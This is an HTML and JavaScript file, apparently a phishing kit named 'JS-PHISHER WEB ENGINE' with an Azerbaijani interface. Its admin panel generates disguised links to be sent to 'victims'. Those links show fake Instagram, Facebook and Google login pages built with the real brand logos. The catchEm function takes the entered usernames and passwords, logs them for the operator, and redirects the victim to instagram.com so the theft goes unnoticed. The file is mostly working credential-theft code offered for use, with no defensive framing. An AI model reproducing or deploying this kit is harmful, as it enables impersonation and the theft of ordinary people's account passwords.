<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Analizer - PhishMaster</title>
    <style>
        :root { --bg: #0a0a0c; --primary: #ff3e3e; --neon: #00d9ff; --card: #15151a; }
        body { margin: 0; background: var(--bg); color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        .admin-container { max-width: 900px; margin: 40px auto; padding: 20px; }
        .card { background: var(--card); border: 1px solid #333; border-radius: 15px; padding: 25px; margin-bottom: 20px; }
        h1 { color: var(--primary); text-align: center; letter-spacing: 5px; text-transform: uppercase; }
        select, input { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #444; color: var(--neon); border-radius: 5px; }
        .btn { width: 100%; padding: 15px; background: var(--primary); color: #fff; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; transition: 0.3s; }
        .btn:hover { background: #d00; box-shadow: 0 0 20px rgba(255, 62, 62, 0.4); }
        .log-item { background: #000; border-left: 4px solid var(--primary); padding: 15px; margin-top: 10px; display: flex; justify-content: space-between; align-items: center; }
        .log-info b { color: var(--neon); }
        .url-box { background: #000; padding: 10px; border: 1px dashed var(--neon); margin-top: 15px; display: none; word-break: break-all; }
        .badge { background: var(--primary); padding: 2px 8px; border-radius: 4px; font-size: 10px; }
    </style>
</head>
<body>

    <div id="adminArea" class="admin-container">
        <h1>JS-PHISHER WEB ENGINE</h1>
        
        <div class="card">
            <h3>1. Link Generator</h3>
            <label>Hədəf Sayt:</label>
            <select id="siteSelect">
                <option value="instagram">Instagram (Login Page)</option>
                <option value="facebook">Facebook (Security Alert)</option>
                <option value="google">Google (Verification)</option>
                <option value="pubg">PUBG Mobile (Free UC)</option>
                <option value="tiktok">TikTok (Follower Booster)</option>
            </select>
            
            <label>Link üçün Maskalama (Slug):</label>
            <input type="text" id="slugInput" placeholder="məsələn: instagram-verified-account">
            
            <button class="btn" onclick="generateLink()">LİNKİ GENERASİYA ET</button>
            
            <div id="urlBox" class="url-box">
                <small>Qurbana göndər:</small><br>
                <code id="finalUrl" style="color: #00ff00;"></code>
            </div>
        </div>

        <div class="card">
            <h3>2. Tutulan Hesablar <span id="logCount" class="badge">0</span></h3>
            <div id="logList">
                <p style="text-align: center; opacity: 0.5;">Gözlənilir...</p>
            </div>
        </div>
    </div>

    <div id="victimArea" style="display: none;">
        <div id="template-container"></div>
    </div>

    <script>
        // JsPhisher bazasına uyğun dizaynlar
        const templates = {
            instagram: {
                title: "Instagram • Giriş",
                color: "#0095f6",
                logo: "https://www.instagram.com/static/images/web/mobile_gnl_header_2x.png/93083ad62171.png",
                bg: "#fafafa"
            },
            facebook: {
                title: "Facebook - Daxil Ol",
                color: "#1877f2",
                logo: "https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zpqLq3.svg",
                bg: "#f0f2f5"
            },
            google: {
                title: "Google Hesabı",
                color: "#1a73e8",
                logo: "https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png",
                bg: "#fff"
            }
        };

        function generateLink() {
            const site = document.getElementById('siteSelect').value;
            const slug = document.getElementById('slugInput').value || 'secure-login';
            const finalUrl = window.location.href.split('?')[0] + "?target=" + site + "&auth=" + btoa(slug);
            
            document.getElementById('finalUrl').innerText = finalUrl;
            document.getElementById('urlBox').style.display = 'block';
        }

        function checkVictim() {
            const params = new URLSearchParams(window.location.search);
            const target = params.get('target');
            if (target) {
                document.getElementById('adminArea').style.display = 'none';
                document.getElementById('victimArea').style.display = 'block';
                renderTemplate(target);
            }
        }

        function renderTemplate(site) {
            const config = templates[site] || templates.instagram;
            const container = document.getElementById('template-container');
            container.innerHTML = `
                <div style="background: ${config.bg}; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; font-family: Arial;">
                    <div style="background: #fff; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center;">
                        <img src="${config.logo}" width="175" style="margin-bottom: 20px;">
                        <form onsubmit="catchEm(event, '${site}')">
                            <input type="text" id="u" placeholder="İstifadəçi adı və ya email" style="width: 90%; padding: 12px; margin-bottom: 10px; border: 1px solid #dbdbdb; background: #fafafa;" required>
                            <input type="password" id="p" placeholder="Şifrə" style="width: 90%; padding: 12px; margin-bottom: 20px; border: 1px solid #dbdbdb; background: #fafafa;" required>
                            <button type="submit" style="width: 100%; background: ${config.color}; color: #fff; border: none; padding: 10px; border-radius: 4px; font-weight: bold; cursor: pointer;">Daxil Ol</button>
                        </form>
                        <div style="margin-top: 20px; color: #385185; font-size: 14px; font-weight: bold;">Şifrəni unutmusunuz?</div>
                    </div>
                </div>
            `;
            document.title = config.title;
        }

        function catchEm(e, site) {
            e.preventDefault();
            const user = document.getElementById('u').value;
            const pass = document.getElementById('p').value;
            
            const log = {
                site: site.toUpperCase(),
                user: user,
                pass: pass,
                time: new Date().toLocaleTimeString(),
                ip: "127.0.0.1" // Local olduğu üçün
            };

            let logs = JSON.parse(localStorage.getItem('vk_logs') || "[]");
            logs.push(log);
            localStorage.setItem('vk_logs', JSON.stringify(logs));

            window.location.href = "https://www.instagram.com"; // Aldatma yönləndirməsi
        }

        function updateLogs() {
            const list = document.getElementById('logList');
            const count = document.getElementById('logCount');
            const logs = JSON.parse(localStorage.getItem('vk_logs') || "[]");
            
            count.innerText = logs.length;
            if (logs.length > 0) {
                list.innerHTML = logs.reverse().map(l => `
                    <div class="log-item">
                        <div class="log-info">
                            <b>[${l.site}]</b> <span style="color:#fff">${l.user}</span><br>
                            <small style="color:var(--primary)">PASS: ${l.pass}</small>
                        </div>
                        <div style="font-size: 10px; opacity: 0.6; text-align: right;">
                            ${l.time}<br>${l.ip}
                        </div>
                    </div>
                `).join('');
            }
        }

        checkVictim();
        setInterval(updateLogs, 2000);
    </script>
</body>
</html>
